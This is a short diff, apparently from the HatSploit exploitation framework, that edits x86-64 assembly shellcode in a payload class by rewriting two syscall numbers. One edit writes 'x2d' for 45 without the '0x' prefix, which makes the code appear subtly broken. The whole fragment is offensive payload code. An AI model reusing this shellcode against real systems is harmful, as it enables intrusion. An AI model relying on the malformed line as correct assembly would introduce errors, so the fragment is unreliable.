@@ -51,12 +51,12 @@ class HatSploitPayload(Payload, Handler):
                 mov r10, 0x100
                 xor r8, r8
                 xor r9, r9
-                mov rax, 45
+                mov rax, x2d
                 syscall
 
                 and rsp, -0x10
                 add sp, 80
-                mov rax, 112
+                mov rax, 0x70
                 push rax
                 mov rcx, rsp
                 xor rbx, rbx
